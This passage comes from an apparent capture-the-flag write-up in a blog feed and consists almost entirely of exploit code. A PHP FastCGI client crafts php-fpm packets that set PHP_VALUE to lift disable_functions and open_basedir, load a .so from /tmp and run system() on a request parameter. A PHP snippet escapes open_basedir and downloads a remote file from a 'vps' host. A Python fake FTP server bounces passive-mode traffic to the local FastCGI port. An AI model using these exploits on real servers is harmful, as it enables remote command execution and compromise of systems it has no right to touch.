class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> Boolean true if the connection should stay alive, false otherwise</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getKeepAlive</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;_keepAlive;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Create a connection to the FastCGI application</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">connect</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;_sock) &#123;</span><br><span class="line">            <span class="comment">//$this-&gt;_sock = fsockopen($this-&gt;_host, $this-&gt;_port, $errno, $errstr, 5);</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;_sock = stream_socket_client(<span class="keyword">$this</span>-&gt;_host, <span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="number">5</span>);</span><br><span class="line">            <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;_sock) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&#x27;Unable to connect to FastCGI application&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Build a FastCGI packet</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> Integer $type Type of the packet</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> String $content Content of the packet</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> Integer $requestId RequestId</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">buildPacket</span>(<span class="params"><span class="variable">$type</span>, <span class="variable">$content</span>, <span class="variable">$requestId</span> = <span class="number">1</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$clen</span> = strlen(<span class="variable">$content</span>);</span><br><span class="line">        <span class="keyword">return</span> chr(<span class="built_in">self</span>::VERSION_1)         <span class="comment">/* version */</span></span><br><span class="line">            . chr(<span class="variable">$type</span>)                    <span class="comment">/* type */</span></span><br><span class="line">            . chr((<span class="variable">$requestId</span> &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) <span class="comment">/* requestIdB1 */</span></span><br><span class="line">            . chr(<span class="variable">$requestId</span> &amp; <span class="number">0xFF</span>)        <span class="comment">/* requestIdB0 */</span></span><br><span class="line">            . chr((<span class="variable">$clen</span> &gt;&gt; <span class="number">8</span> ) &amp; <span class="number">0xFF</span>)     <span class="comment">/* contentLengthB1 */</span></span><br><span class="line">            . chr(<span class="variable">$clen</span> &amp; <span class="number">0xFF</span>)             <span class="comment">/* contentLengthB0 */</span></span><br><span class="line">            . chr(<span class="number">0</span>)                        <span class="comment">/* paddingLength */</span></span><br><span class="line">            . chr(<span class="number">0</span>)                        <span class="comment">/* reserved */</span></span><br><span class="line">            . <span class="variable">$content</span>;                     <span class="comment">/* content */</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Build an FastCGI Name value pair</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> String $name Name</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> String $value Value</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> String FastCGI Name value pair</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">buildNvpair</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$nlen</span> = strlen(<span class="variable">$name</span>);</span><br><span class="line">        <span class="variable">$vlen</span> = strlen(<span class="variable">$value</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$nlen</span> &lt; <span class="number">128</span>) &#123;</span><br><span class="line">            <span class="comment">/* nameLengthB0 */</span></span><br><span class="line">            <span class="variable">$nvpair</span> = chr(<span class="variable">$nlen</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">/* nameLengthB3 &amp; nameLengthB2 &amp; nameLengthB1 &amp; nameLengthB0 */</span></span><br><span class="line">            <span class="variable">$nvpair</span> = chr((<span class="variable">$nlen</span> &gt;&gt; <span class="number">24</span>) | <span class="number">0x80</span>) . chr((<span class="variable">$nlen</span> &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>) . chr((<span class="variable">$nlen</span> &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) . chr(<span class="variable">$nlen</span> &amp; <span class="number">0xFF</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$vlen</span> &lt; <span class="number">128</span>) &#123;</span><br><span class="line">            <span class="comment">/* valueLengthB0 */</span></span><br><span class="line">            <span class="variable">$nvpair</span> .= chr(<span class="variable">$vlen</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">/* valueLengthB3 &amp; valueLengthB2 &amp; valueLengthB1 &amp; valueLengthB0 */</span></span><br><span class="line">            <span class="variable">$nvpair</span> .= chr((<span class="variable">$vlen</span> &gt;&gt; <span class="number">24</span>) | <span class="number">0x80</span>) . chr((<span class="variable">$vlen</span> &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>) . chr((<span class="variable">$vlen</span> &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) . chr(<span class="variable">$vlen</span> &amp; <span class="number">0xFF</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/* nameData &amp; valueData */</span></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$nvpair</span> . <span class="variable">$name</span> . <span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Read a set of FastCGI Name value pairs</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> String $data Data containing the set of FastCGI NVPair</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> array of NVPair</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">readNvpair</span>(<span class="params"><span class="variable">$data</span>, <span class="variable">$length</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$array</span> = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$length</span> === <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="variable">$length</span> = strlen(<span class="variable">$data</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$p</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (<span class="variable">$p</span> != <span class="variable">$length</span>) &#123;</span><br><span class="line">            <span class="variable">$nlen</span> = ord(<span class="variable">$data</span>&#123;<span class="variable">$p</span>++&#125;);</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$nlen</span> &gt;= <span class="number">128</span>) &#123;</span><br><span class="line">                <span class="variable">$nlen</span> = (<span class="variable">$nlen</span> &amp; <span class="number">0x7F</span> &lt;&lt; <span class="number">24</span>);</span><br><span class="line">                <span class="variable">$nlen</span> |= (ord(<span class="variable">$data</span>&#123;<span class="variable">$p</span>++&#125;) &lt;&lt; <span class="number">16</span>);</span><br><span class="line">                <span class="variable">$nlen</span> |= (ord(<span class="variable">$data</span>&#123;<span class="variable">$p</span>++&#125;) &lt;&lt; <span class="number">8</span>);</span><br><span class="line">                <span class="variable">$nlen</span> |= (ord(<span class="variable">$data</span>&#123;<span class="variable">$p</span>++&#125;));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$vlen</span> = ord(<span class="variable">$data</span>&#123;<span class="variable">$p</span>++&#125;);</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$vlen</span> &gt;= <span class="number">128</span>) &#123;</span><br><span class="line">                <span class="variable">$vlen</span> = (<span class="variable">$nlen</span> &amp; <span class="number">0x7F</span> &lt;&lt; <span class="number">24</span>);</span><br><span class="line">                <span class="variable">$vlen</span> |= (ord(<span class="variable">$data</span>&#123;<span class="variable">$p</span>++&#125;) &lt;&lt; <span class="number">16</span>);</span><br><span class="line">                <span class="variable">$vlen</span> |= (ord(<span class="variable">$data</span>&#123;<span class="variable">$p</span>++&#125;) &lt;&lt; <span class="number">8</span>);</span><br><span class="line">                <span class="variable">$vlen</span> |= (ord(<span class="variable">$data</span>&#123;<span class="variable">$p</span>++&#125;));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$array</span>[substr(<span class="variable">$data</span>, <span class="variable">$p</span>, <span class="variable">$nlen</span>)] = substr(<span class="variable">$data</span>, <span class="variable">$p</span>+<span class="variable">$nlen</span>, <span class="variable">$vlen</span>);</span><br><span class="line">            <span class="variable">$p</span> += (<span class="variable">$nlen</span> + <span class="variable">$vlen</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$array</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Decode a FastCGI Packet</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> String $data String containing all the packet</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> array</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">decodePacketHeader</span>(<span class="params"><span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$ret</span> = <span class="keyword">array</span>();</span><br><span class="line">        <span class="variable">$ret</span>[<span class="string">&#x27;version&#x27;</span>]       = ord(<span class="variable">$data</span>&#123;<span class="number">0</span>&#125;);</span><br><span class="line">        <span class="variable">$ret</span>[<span class="string">&#x27;type&#x27;</span>]          = ord(<span class="variable">$data</span>&#123;<span class="number">1</span>&#125;);</span><br><span class="line">        <span class="variable">$ret</span>[<span class="string">&#x27;requestId&#x27;</span>]     = (ord(<span class="variable">$data</span>&#123;<span class="number">2</span>&#125;) &lt;&lt; <span class="number">8</span>) + ord(<span class="variable">$data</span>&#123;<span class="number">3</span>&#125;);</span><br><span class="line">        <span class="variable">$ret</span>[<span class="string">&#x27;contentLength&#x27;</span>] = (ord(<span class="variable">$data</span>&#123;<span class="number">4</span>&#125;) &lt;&lt; <span class="number">8</span>) + ord(<span class="variable">$data</span>&#123;<span class="number">5</span>&#125;);</span><br><span class="line">        <span class="variable">$ret</span>[<span class="string">&#x27;paddingLength&#x27;</span>] = ord(<span class="variable">$data</span>&#123;<span class="number">6</span>&#125;);</span><br><span class="line">        <span class="variable">$ret</span>[<span class="string">&#x27;reserved&#x27;</span>]      = ord(<span class="variable">$data</span>&#123;<span class="number">7</span>&#125;);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$ret</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Read a FastCGI Packet</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> array</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">readPacket</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$packet</span> = fread(<span class="keyword">$this</span>-&gt;_sock, <span class="built_in">self</span>::HEADER_LEN)) &#123;</span><br><span class="line">            <span class="variable">$resp</span> = <span class="keyword">$this</span>-&gt;decodePacketHeader(<span class="variable">$packet</span>);</span><br><span class="line">            <span class="variable">$resp</span>[<span class="string">&#x27;content&#x27;</span>] = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$resp</span>[<span class="string">&#x27;contentLength&#x27;</span>]) &#123;</span><br><span class="line">                <span class="variable">$len</span>  = <span class="variable">$resp</span>[<span class="string">&#x27;contentLength&#x27;</span>];</span><br><span class="line">                <span class="keyword">while</span> (<span class="variable">$len</span> &amp;&amp; <span class="variable">$buf</span>=fread(<span class="keyword">$this</span>-&gt;_sock, <span class="variable">$len</span>)) &#123;</span><br><span class="line">                    <span class="variable">$len</span> -= strlen(<span class="variable">$buf</span>);</span><br><span class="line">                    <span class="variable">$resp</span>[<span class="string">&#x27;content&#x27;</span>] .= <span class="variable">$buf</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$resp</span>[<span class="string">&#x27;paddingLength&#x27;</span>]) &#123;</span><br><span class="line">                <span class="variable">$buf</span>=fread(<span class="keyword">$this</span>-&gt;_sock, <span class="variable">$resp</span>[<span class="string">&#x27;paddingLength&#x27;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$resp</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Get Informations on the FastCGI application</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> array $requestedInfo information to retrieve</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> array</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getValues</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$requestedInfo</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;connect();</span><br><span class="line">        <span class="variable">$request</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$requestedInfo</span> <span class="keyword">as</span> <span class="variable">$info</span>) &#123;</span><br><span class="line">            <span class="variable">$request</span> .= <span class="keyword">$this</span>-&gt;buildNvpair(<span class="variable">$info</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        fwrite(<span class="keyword">$this</span>-&gt;_sock, <span class="keyword">$this</span>-&gt;buildPacket(<span class="built_in">self</span>::GET_VALUES, <span class="variable">$request</span>, <span class="number">0</span>));</span><br><span class="line">        <span class="variable">$resp</span> = <span class="keyword">$this</span>-&gt;readPacket();</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$resp</span>[<span class="string">&#x27;type&#x27;</span>] == <span class="built_in">self</span>::GET_VALUES_RESULT) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;readNvpair(<span class="variable">$resp</span>[<span class="string">&#x27;content&#x27;</span>], <span class="variable">$resp</span>[<span class="string">&#x27;length&#x27;</span>]);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&#x27;Unexpected response type, expecting GET_VALUES_RESULT&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Execute a request to the FastCGI application</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> array $params Array of parameters</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> String $stdin Content</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> String</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">request</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$params</span>, <span class="variable">$stdin</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$response</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="comment">//        $this-&gt;connect();</span></span><br><span class="line">        <span class="variable">$request</span> = <span class="keyword">$this</span>-&gt;buildPacket(<span class="built_in">self</span>::BEGIN_REQUEST, chr(<span class="number">0</span>) . chr(<span class="built_in">self</span>::RESPONDER) . chr((<span class="keyword">int</span>) <span class="keyword">$this</span>-&gt;_keepAlive) . str_repeat(chr(<span class="number">0</span>), <span class="number">5</span>));</span><br><span class="line">        <span class="variable">$paramsRequest</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$params</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">            <span class="variable">$paramsRequest</span> .= <span class="keyword">$this</span>-&gt;buildNvpair(<span class="variable">$key</span>, <span class="variable">$value</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$paramsRequest</span>) &#123;</span><br><span class="line">            <span class="variable">$request</span> .= <span class="keyword">$this</span>-&gt;buildPacket(<span class="built_in">self</span>::PARAMS, <span class="variable">$paramsRequest</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$request</span> .= <span class="keyword">$this</span>-&gt;buildPacket(<span class="built_in">self</span>::PARAMS, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$stdin</span>) &#123;</span><br><span class="line">            <span class="variable">$request</span> .= <span class="keyword">$this</span>-&gt;buildPacket(<span class="built_in">self</span>::STDIN, <span class="variable">$stdin</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$request</span> .= <span class="keyword">$this</span>-&gt;buildPacket(<span class="built_in">self</span>::STDIN, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&#x27;?file=ftp://ip:9999&amp;data=&#x27;</span>.urlencode(<span class="variable">$request</span>));</span><br><span class="line"><span class="comment">//        fwrite($this-&gt;_sock, $request);</span></span><br><span class="line"><span class="comment">//        do &#123;</span></span><br><span class="line"><span class="comment">//            $resp = $this-&gt;readPacket();</span></span><br><span class="line"><span class="comment">//            if ($resp[&#x27;type&#x27;] == self::STDOUT || $resp[&#x27;type&#x27;] == self::STDERR) &#123;</span></span><br><span class="line"><span class="comment">//                $response .= $resp[&#x27;content&#x27;];</span></span><br><span class="line"><span class="comment">//            &#125;</span></span><br><span class="line"><span class="comment">//        &#125; while ($resp &amp;&amp; $resp[&#x27;type&#x27;] != self::END_REQUEST);</span></span><br><span class="line"><span class="comment">//        var_dump($resp);</span></span><br><span class="line"><span class="comment">//        if (!is_array($resp)) &#123;</span></span><br><span class="line"><span class="comment">//            throw new Exception(&#x27;Bad request&#x27;);</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line"><span class="comment">//        switch (ord($resp[&#x27;content&#x27;]&#123;4&#125;)) &#123;</span></span><br><span class="line"><span class="comment">//            case self::CANT_MPX_CONN:</span></span><br><span class="line"><span class="comment">//                throw new Exception(&#x27;This app can\&#x27;t multiplex [CANT_MPX_CONN]&#x27;);</span></span><br><span class="line"><span class="comment">//                break;</span></span><br><span class="line"><span class="comment">//            case self::OVERLOADED:</span></span><br><span class="line"><span class="comment">//                throw new Exception(&#x27;New request rejected; too busy [OVERLOADED]&#x27;);</span></span><br><span class="line"><span class="comment">//                break;</span></span><br><span class="line"><span class="comment">//            case self::UNKNOWN_ROLE:</span></span><br><span class="line"><span class="comment">//                throw new Exception(&#x27;Role value not known [UNKNOWN_ROLE]&#x27;);</span></span><br><span class="line"><span class="comment">//                break;</span></span><br><span class="line"><span class="comment">//            case self::REQUEST_COMPLETE:</span></span><br><span class="line"><span class="comment">//                return $response;</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// real exploit start here</span></span><br><span class="line"><span class="comment">//if (!isset($_REQUEST[&#x27;cmd&#x27;])) &#123;</span></span><br><span class="line"><span class="comment">//    die(&quot;Check your input\n&quot;);</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//if (!isset($_REQUEST[&#x27;filepath&#x27;])) &#123;</span></span><br><span class="line"><span class="comment">//    $filepath = __FILE__;</span></span><br><span class="line"><span class="comment">//&#125;else&#123;</span></span><br><span class="line"><span class="comment">//    $filepath = $_REQUEST[&#x27;filepath&#x27;];</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$filepath</span> = <span class="string">&quot;/var/www/html/add_api.php&quot;</span>;</span><br><span class="line"><span class="variable">$req</span> = <span class="string">&#x27;/&#x27;</span>.basename(<span class="variable">$filepath</span>);</span><br><span class="line"><span class="variable">$uri</span> = <span class="variable">$req</span> .<span class="string">&#x27;?&#x27;</span>.<span class="string">&#x27;command=whoami&#x27;</span>;</span><br><span class="line"><span class="variable">$client</span> = <span class="keyword">new</span> FCGIClient(<span class="string">&quot;unix:///var/run/php-fpm.sock&quot;</span>, -<span class="number">1</span>);</span><br><span class="line"><span class="variable">$code</span> = <span class="string">&quot;&lt;?php system(\$_REQUEST[&#x27;command&#x27;]); phpinfo(); ?&gt;&quot;</span>; <span class="comment">// php payload -- Doesnt do anything</span></span><br><span class="line"><span class="variable">$php_value</span> = <span class="string">&quot;unserialize_callback_func = system\nextension_dir = /tmp\nextension = hpdoger.so\ndisable_classes = \ndisable_functions = \nallow_url_include = On\nopen_basedir = /\nauto_prepend_file = &quot;</span>;</span><br><span class="line"><span class="variable">$params</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;GATEWAY_INTERFACE&#x27;</span> =&gt; <span class="string">&#x27;FastCGI/1.0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;REQUEST_METHOD&#x27;</span>    =&gt; <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;SCRIPT_FILENAME&#x27;</span>   =&gt; <span class="variable">$filepath</span>,</span><br><span class="line">    <span class="string">&#x27;SCRIPT_NAME&#x27;</span>       =&gt; <span class="variable">$req</span>,</span><br><span class="line">    <span class="string">&#x27;QUERY_STRING&#x27;</span>      =&gt; <span class="string">&#x27;command=whoami&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;REQUEST_URI&#x27;</span>       =&gt; <span class="variable">$uri</span>,</span><br><span class="line">    <span class="string">&#x27;DOCUMENT_URI&#x27;</span>      =&gt; <span class="variable">$req</span>,</span><br><span class="line"><span class="comment">#&#x27;DOCUMENT_ROOT&#x27;     =&gt; &#x27;/&#x27;,</span></span><br><span class="line">    <span class="string">&#x27;PHP_VALUE&#x27;</span>         =&gt; <span class="variable">$php_value</span>,</span><br><span class="line">    <span class="string">&#x27;SERVER_SOFTWARE&#x27;</span>   =&gt; <span class="string">&#x27;80sec/wofeiwo&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;REMOTE_ADDR&#x27;</span>       =&gt; <span class="string">&#x27;127.0.0.1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;REMOTE_PORT&#x27;</span>       =&gt; <span class="string">&#x27;9000&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;SERVER_ADDR&#x27;</span>       =&gt; <span class="string">&#x27;127.0.0.1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;SERVER_PORT&#x27;</span>       =&gt; <span class="string">&#x27;80&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;SERVER_NAME&#x27;</span>       =&gt; <span class="string">&#x27;localhost&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;SERVER_PROTOCOL&#x27;</span>   =&gt; <span class="string">&#x27;HTTP/1.1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;CONTENT_LENGTH&#x27;</span>    =&gt; strlen(<span class="variable">$code</span>)</span><br><span class="line">);</span><br><span class="line"><span class="comment">// print_r($_REQUEST);</span></span><br><span class="line"><span class="comment">// print_r($params);</span></span><br><span class="line"><span class="comment">//echo &quot;Call: $uri\n\n&quot;;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$client</span>-&gt;request(<span class="variable">$params</span>, <span class="variable">$code</span>).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mkdir(<span class="string">&#x27;Du1&#x27;</span>);</span><br><span class="line">chdir(<span class="string">&#x27;Du1&#x27;</span>);</span><br><span class="line">ini_set(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;..&#x27;</span>);</span><br><span class="line">chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);</span><br><span class="line">chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);</span><br><span class="line">ini_set(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">copy(<span class="string">&quot;http://vps/fastcgi.php&quot;</span>,<span class="string">&quot;/tmp/fastcgi.php&quot;</span>);</span><br><span class="line"><span class="comment">// copy(&quot;http://vps/hpdoger.so&quot;,&quot;/tmp/hpdoger.so&quot;);</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.bind((<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">9999</span>))</span><br><span class="line">s.listen(<span class="number">1</span>)</span><br><span class="line">conn, addr = s.accept()</span><br><span class="line">conn.send(<span class="string">b&#x27;220 welcome\n&#x27;</span>)</span><br><span class="line"><span class="comment">#Service ready for new user.</span></span><br><span class="line"><span class="comment">#Client send anonymous username</span></span><br><span class="line"><span class="comment">#USER anonymous</span></span><br><span class="line">conn.send(<span class="string">b&#x27;331 Please specify the password.\n&#x27;</span>)</span><br><span class="line"><span class="comment">#User name okay, need password.</span></span><br><span class="line"><span class="comment">#Client send anonymous password.</span></span><br><span class="line"><span class="comment">#PASS anonymous</span></span><br><span class="line">conn.send(<span class="string">b&#x27;230 Login successful.\n&#x27;</span>)</span><br><span class="line"><span class="comment">#User logged in, proceed. Logged out if appropriate.</span></span><br><span class="line"><span class="comment">#TYPE I</span></span><br><span class="line">conn.send(<span class="string">b&#x27;200 Switching to Binary mode.\n&#x27;</span>)</span><br><span class="line"><span class="comment">#Size /</span></span><br><span class="line">conn.send(<span class="string">b&#x27;550 Could not get the file size.\n&#x27;</span>)</span><br><span class="line"><span class="comment">#EPSV (1)</span></span><br><span class="line">conn.send(<span class="string">b&#x27;150 ok\n&#x27;</span>)</span><br><span class="line"><span class="comment">#PASV</span></span><br><span class="line">conn.send(<span class="string">b&#x27;227 Entering Extended Passive Mode (127,0,0,1,0,9000)\n&#x27;</span>) <span class="comment">#STOR / (2)</span></span><br><span class="line">conn.send(<span class="string">b&#x27;150 Permission denied.\n&#x27;</span>)</span><br><span class="line"><span class="comment">#QUIT</span></span><br><span class="line">conn.send(<span class="string">b&#x27;221 Goodbye.\n&#x27;</span>)</span><br><span class="line">conn.close()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Write Up </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于PHP-AST这件事</title>
      <link href="2021/04/27/%E5%85%B3%E4%BA%8EPHP-AST%E8%BF%99%E4%BB%B6%E4%BA%8B/"/>
      <url>2021/04/27/%E5%85%B3%E4%BA%8EPHP-AST%E8%BF%99%E4%BB%B6%E4%BA%8B/</url>
      
